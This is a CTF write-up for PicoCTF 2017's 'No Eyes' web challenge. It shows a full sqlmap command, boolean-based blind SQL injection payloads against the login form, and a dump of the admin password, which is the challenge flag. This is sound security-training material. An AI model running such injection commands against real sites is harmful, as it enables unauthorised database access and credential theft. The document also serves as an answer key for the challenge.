# PicoCTF_2017: No Eyes

**Category:** Web Exploitation
**Points:** 125
**Description:**

>The [website](http://shell2017.picoctf.com:21088/) isn't really me much, but you can still get the admin password, right?

**Hint:**

>Sometimes an error message can be just as useful.

## Write-up
For this one, instead of crafting our own queries, let's use the amazing tool, [SQLMap](https://github.com/sqlmapproject/sqlmap), an automated SQL injection tool.

    ./sqlmap.py -u http://shell2017.picoctf.com:21088/ --data "username=admin&password=password" -o --threads=10 --level 5 --risk 3  --dump
            ___
           __H__
     ___ ___[)]_____ ___ ___  {1.1.3.19#dev}
    |_ -| . ["]     | .'| . |
    |___|_  [)]_|_|_|__,|  _|
          |_|V          |_|   http://sqlmap.org

    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

    [*] starting at 09:06:58

    [09:06:58] [INFO] resuming back-end DBMS 'sqlite' 
    [09:06:58] [INFO] testing connection to the target URL
    sqlmap resumed the following injection point(s) from stored session:
    ---
    Parameter: password (POST)
        Type: boolean-based blind
        Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
        Payload: username=admin&password=password' OR NOT 4034=4034-- ndmv

    Parameter: username (POST)
        Type: boolean-based blind
        Title: AND boolean-based blind - WHERE or HAVING clause
        Payload: username=admin' AND 1940=1940-- Wbwv&password=password
    ---
    there were multiple injection points, please select the one to use for following injections:
    [0] place: POST, parameter: username, type: Single quoted string (default)
    [1] place: POST, parameter: password, type: Single quoted string
    [q] Quit
    > 0
    [09:07:05] [INFO] the back-end DBMS is SQLite
    back-end DBMS: SQLite
    [09:07:05] [INFO] fetching tables for database: 'SQLite_masterdb'
    [09:07:05] [INFO] fetching number of tables for database 'SQLite_masterdb'
    [09:07:05] [INFO] retrieved: 
    [09:07:05] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
    [09:07:05] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')
    1
    [09:07:06] [INFO] retrieving the length of query output
    [09:07:06] [INFO] retrieved: 5
    [09:07:09] [INFO] retrieved: us_r_ 3/5 (60%)
    [09:07:13] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
    [09:07:14] [INFO] retrieved: users           
    [09:07:14] [INFO] retrieving the length of query output
    [09:07:14] [INFO] retrieved: 40
    [09:07:24] [INFO] retrieved: CREATE TABLE users(user text, pass text)        
    [09:07:24] [INFO] fetching entries for table 'users' in database 'SQLite_masterdb'
    [09:07:24] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
    [09:07:24] [INFO] retrieved: 1
    [09:07:25] [INFO] retrieving the length of query output
    [09:07:25] [INFO] retrieved: 63
    [09:07:40] [INFO] retrieved: not_all_errors_should_be_shown_3c826cdcbf6f146ac6f86e6b65d3b1de
    [09:07:40] [INFO] retrieving the length of query output
    [09:07:40] [INFO] retrieved: 5
    [09:07:44] [INFO] retrieved: admin           
    [09:07:44] [INFO] analyzing table dump for possible password hashes
    Database: SQLite_masterdb
    Table: users
    [1 entry]
    +-------+-----------------------------------------------------------------+
    | user  | pass                                                            |
    +-------+-----------------------------------------------------------------+
    | admin | not_all_errors_should_be_shown_3c826cdcbf6f146ac6f86e6b65d3b1de |
    +-------+-----------------------------------------------------------------+

    [09:07:44] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/root/.sqlmap/output/shell2017.picoctf.com/dump/SQLite_masterdb/users.csv'
    [09:07:44] [INFO] fetched data logged to text files under '/root/.sqlmap/output/shell2017.picoctf.com'

    [*] shutting down at 09:07:44

Therefore, the flag is `not_all_errors_should_be_shown_3c826cdcbf6f146ac6f86e6b65d3b1de`.